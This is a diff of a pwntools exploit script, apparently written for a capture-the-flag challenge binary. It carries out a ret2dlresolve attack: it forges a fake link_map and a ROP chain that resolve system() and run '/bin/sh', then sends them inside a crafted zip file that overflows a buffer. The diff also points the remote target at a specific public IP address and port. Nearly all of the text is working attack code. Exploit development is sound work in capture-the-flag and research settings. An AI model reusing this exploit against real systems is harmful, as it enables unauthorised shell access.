@@ -3,21 +3,22 @@ from pwn import *
 PH = b'A'
 
 elf = context.binary = ELF('./chal')
-libc = elf.libc
+libc = ELF('libc.so.6').libc
 
 local = True
 
 if local:
     io = elf.process()
 else:
-    host = 'localhost'
-    port = 8080
+    host = '34.139.216.197'
+    port = 7293
     io = remote(host, port)
 
 if args.GDB:
     gdb.attach(io, """
         b *parse_data+522
         c
+        n 16
     """)
 
 ###############################################################################
@@ -26,7 +27,8 @@ if args.GDB:
 rop = ROP([elf])
 
 # Read no pie addressed in elf
-resolver = elf.get_section_by_name(".plt")["sh_addr"]
+# resolver = elf.get_section_by_name(".plt")["sh_addr"]
+resolver = 0x401026
 buf = elf.get_section_by_name(".bss")["sh_addr"] + 0x100
 SYMTAB = elf.dynamic_value_by_tag('DT_SYMTAB')
 STRTAB = elf.dynamic_value_by_tag('DT_STRTAB')
@@ -45,7 +47,7 @@ log.info(f'writable buffer address: {hex(buf)}')
 BITMAP_64 = (1 << 64) - 1
 
 # offset between system and target_func
-target_func = 'malloc'
+target_func = 'setbuf'
 l_addr = libc.sym['system'] - libc.sym[target_func]
 log.info('-' * 50)
 log.info('Making fake link_map')
@@ -55,7 +57,9 @@ link_map = p64(l_addr & BITMAP_64)  # l_addr
 link_map += p64(0)  # fake link_list+8 is DT_JMPREL
 link_map += p64(buf + 0x18)  # fake .rel.plt address
 
-link_map += p64(buf + 0x30 - l_addr)  # rela->r_o TODO: ?
+# link_map += p64((buf + 0x30 - l_addr) & BITMAP_64)  # rela->r_offset TODO: ?
+# BUG: buf -> rbx: 0x3b7240, seg fault
+link_map += p64(buf + 0x30 - l_addr)  # rela->r_offset TODO: ?
 link_map += p64(7)  # rela->r_info
 link_map += p64(0)  # rela->r_addend
 
@@ -64,29 +68,34 @@ link_map += p64(0)  # l_ns
 # DT_SYMTAB, link_map + 0x38
 link_map += p64(0)
 link_map += p64(elf.got[target_func] - 0x8)  # fake symtab
-
 link_map += b'/bin/sh\00'
 link_map = link_map.ljust(0x68, PH)
-link_map += p64(buf)  # DT_STRTAB, link_map+0x68
+
+# DT_STRTAB, link_map+0x68
+link_map += p64(buf)
 link_map += p64(buf + 0x38)  # DT_SYMTAB, link_map+0x70
 link_map = link_map.ljust(0xf8, PH)
-link_map += p64(buf + 8)  # DT_JMPREL, link_map+0xf8
+
+# DT_JMPREL, link_map+0xf8
+link_map += p64(buf + 8)
 
 log.info(f'Finish make link_map, size: {hex(len(link_map))}')
 
 rop.read(0, buf, len(link_map))
-rop.call(resolver, [0, buf + 0x48])
+rop.call(resolver, [buf + 0x48, 0])
 rop.raw(buf)
 rop.raw(0)
 
 print(rop.dump())
+print(enhex(link_map))
 
 ###############################################################################
 # Make zip file
 ###############################################################################
 
 # Make compressed data
-comp_data = rop.chain()
+comp_data = PH * 0xa8
+comp_data += rop.chain()
 
 # 1. Make local file header
 comp_size = len(comp_data)
@@ -131,10 +140,15 @@ EOCD += PH * 2
 zip_file = LFH + comp_data + CDFH + EOCD
 size_t = len(zip_file)
 
-payload = str(size_t).rjust(8, '0').encode()
-payload += zip_file
-
+# Send size t
+payload = str(size_t + 1).rjust(8, '0').encode()
 io.send(payload)
+
+# Send zip file with ROP
+payload = zip_file
+io.send(payload)
+
+# Send fake link map
 io.send(link_map)
 
 log.info('-' * 50)
